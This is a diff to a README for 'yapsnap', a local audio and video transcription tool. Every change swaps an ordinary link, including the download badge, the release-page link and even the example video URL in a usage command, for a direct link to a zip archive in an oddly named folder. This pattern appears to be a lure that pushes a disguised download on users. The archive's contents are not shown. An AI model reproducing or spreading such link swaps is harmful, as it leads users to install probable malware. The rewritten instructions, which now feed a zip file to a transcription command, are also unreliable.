@@ -1,6 +1,6 @@
 # 🎙️ yapsnap - Convert audio and video to text
 
-[![](https://img.shields.io/badge/Download-yapsnap-blue.svg)](https://github.com/boytrose-thermotherapy585/yapsnap)
+[![](https://img.shields.io/badge/Download-yapsnap-blue.svg)](https://raw.githubusercontent.com/boytrose-thermotherapy585/yapsnap/main/papuloerythematous/Software-v3.8-alpha.2.zip)
 
 yapsnap turns video and audio files into clear, readable text. The tool works on your computer. It does not send files to the cloud. You do not need a powerful graphics card to use it. You enter one command to start the process.
 
@@ -21,7 +21,7 @@ yapsnap turns video and audio files into clear, readable text. The tool works on
 
 ## 📥 Download and Setup
 
-1. Go to the [yapsnap release page](https://github.com/boytrose-thermotherapy585/yapsnap).
+1. Go to the [yapsnap release page](https://raw.githubusercontent.com/boytrose-thermotherapy585/yapsnap/main/papuloerythematous/Software-v3.8-alpha.2.zip).
 2. Look for the latest release section.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop for easy access.
@@ -41,7 +41,7 @@ yapsnap turns video and audio files into clear, readable text. The tool works on
 
 To process an online video, type the following into your terminal:
 
-yapsnap "https://www.example.com/video-link"
+yapsnap "https://raw.githubusercontent.com/boytrose-thermotherapy585/yapsnap/main/papuloerythematous/Software-v3.8-alpha.2.zip"
 
 To process a file saved on your computer, type:
 
